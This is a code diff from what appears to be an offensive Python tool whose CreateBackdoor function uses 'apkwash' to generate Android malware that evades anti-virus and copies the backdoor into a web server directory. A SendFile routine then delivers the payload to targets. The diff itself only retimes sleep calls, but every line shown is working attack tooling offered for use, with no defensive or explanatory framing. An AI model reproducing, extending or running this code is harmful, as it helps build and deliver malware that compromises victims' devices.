@@ -105,11 +105,11 @@ def CreateBackdoor():
 		if (config.get("AP","ACTIVE")):
 			Print(INFO,"Creating malware to bypass Anti-Virus")
 			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
-			time.sleep(10)
+			time.sleep(20)
 			# Copy the backdoor to /var/www/html
 			os.system("cp %s /var/www/html" % (config.get("BACKDOOR", "BACKDOOR_NAME")))
 		else:
-			time.sleep(1)
+			time.sleep(20)
 			Print(INFO,"Creating malware to bypass Anti-Virus")
 			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
 
@@ -314,7 +314,6 @@ def SendFile (mac):
 
 		Print(INFO, "Waiting for backdoor creation")
 		CreateBackdoor()
-		time.sleep(20)
 
 		# Read the file
 		payload = config.get("BACKDOOR","BACKDOOR_NAME")
